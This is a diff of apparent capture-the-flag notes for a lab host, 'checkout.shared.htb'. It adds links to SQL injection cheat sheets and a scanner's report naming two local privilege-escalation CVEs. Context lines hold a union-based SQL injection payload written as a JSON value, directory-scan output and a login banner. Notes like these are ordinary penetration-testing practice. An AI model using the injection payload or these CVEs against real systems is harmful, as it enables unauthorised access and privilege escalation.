@@ -50,6 +50,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 Found: checkout.shared.htb (Status: 200) [Size: 3229]
 ```
 
+
+https://book.hacktricks.xyz/pentesting-web/sql-injection
 https://www.noobsec.net/sqli-cheatsheet/
 
 ```{"-1' union select 'a','b','c'-- -":"1"}```
@@ -95,3 +97,9 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Fri Sep 16 18:43:35 2022 from 10.10.14.6
 ```
+
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+
+Vulnerable to CVE-2022-0847
